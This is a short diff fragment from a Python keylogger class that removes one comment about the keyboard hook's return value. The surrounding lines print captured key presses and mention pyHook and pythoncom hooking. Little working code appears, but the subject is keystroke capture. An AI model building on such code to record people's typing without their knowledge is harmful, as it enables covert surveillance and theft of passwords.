@@ -45,7 +45,6 @@ class Keylogger:
         print(press)
         print(self.keyLog)
 
-            #returning True means the function doesn't try and stick around: it goes to the next key press
         return True
 
 #pyHook and pythoncom functions that catches when the user does something, for us, a keyboard press
